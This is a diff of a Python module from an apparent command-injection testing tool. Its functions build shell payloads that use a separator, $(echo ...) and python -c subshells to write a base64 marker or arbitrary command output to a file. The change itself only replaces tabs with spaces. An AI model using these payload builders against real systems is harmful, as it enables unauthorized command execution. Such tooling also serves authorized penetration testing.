@@ -25,8 +25,8 @@
 def decision(separator,B64_ENC_TAG,B64_DEC_TRICK,OUTPUT_TEXTFILE):
   
   payload = (separator + " " +
-	    "$(echo " + B64_ENC_TAG + "" + B64_DEC_TRICK + " > " + OUTPUT_TEXTFILE + ")"
-	    ) 
+            "$(echo " + B64_ENC_TAG + "" + B64_DEC_TRICK + " > " + OUTPUT_TEXTFILE + ")"
+            ) 
   
   return payload
 
@@ -35,8 +35,8 @@ __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_shell(separator,B64_ENC_TAG,B64_DEC_TRICK,OUTPUT_TEXTFILE):
   payload = (separator + " " + 
-	    "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "','w')\nf.write('"+ B64_ENC_TAG + "" + B64_DEC_TRICK + "')\nf.close()\n\")"
-	     ) 
+            "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "','w')\nf.write('"+ B64_ENC_TAG + "" + B64_DEC_TRICK + "')\nf.close()\n\")"
+             ) 
 
   return payload
 
@@ -46,8 +46,8 @@ def decision_alter_shell(separator,B64_ENC_TAG,B64_DEC_TRICK,OUTPUT_TEXTFILE):
 def cmd_execution(separator,cmd,OUTPUT_TEXTFILE):
   
   payload = (separator +
-	     "echo $(" + cmd + " > " + OUTPUT_TEXTFILE + ")" 
-	    )
+             "echo $(" + cmd + " > " + OUTPUT_TEXTFILE + ")" 
+            )
 
   return payload
 
@@ -56,7 +56,7 @@ __Warning__: The alternative shells are still experimental.
 """
 def cmd_execution_alter_shell(separator,cmd,OUTPUT_TEXTFILE):
   payload = (separator + 
-	    "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "','w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")"
-	    )
+            "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "','w')\nf.write('$(echo $(" + cmd + "))')\nf.close()\n\")"
+            )
   
   return payload
